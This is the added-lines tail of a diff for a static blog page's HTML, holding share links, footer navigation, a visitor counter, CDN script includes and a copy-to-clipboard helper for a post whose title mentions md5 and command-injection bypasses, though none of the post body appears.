+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2021/02/19/raoguo/&title=一些绕过（md5，命令注入）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2021/02/19/raoguo/&name=一些绕过（md5，命令注入）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2021/02/19/raoguo/&t=一些绕过（md5，命令注入）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
